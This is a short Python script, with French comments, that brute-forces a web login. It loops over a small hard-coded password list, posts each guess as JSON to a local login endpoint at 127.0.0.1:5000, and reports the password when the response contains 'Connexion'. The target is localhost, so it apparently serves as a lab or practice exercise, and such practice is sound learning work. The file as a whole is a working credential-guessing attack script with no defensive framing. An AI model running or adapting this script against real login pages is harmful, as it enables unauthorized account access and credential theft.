import requests
def brute_force_login(url, username, list_pass):
    for passw in list_pass:
        print(f"Essai de connexion avec le mot de passe : {passw}")

        dataX = {'username': username, 'password': passw}

        # Envoyer la requête POST avec les données JSON
        response = requests.post(url, json=dataX)

        # Vérifier si la réponse indique une connexion réussie
        if "Connexion" in response.text:
            print(f"Mot de passe trouvé : {passw}")
            return True

    print("Mot de passe non trouvé dans la liste")
    return False


url = "http://127.0.0.1:5000/login"
list_pass = ['pass', 'brice', 'gnongno', 'tata', 'azerty']
result = brute_force_login(url, 'brice', list_pass)
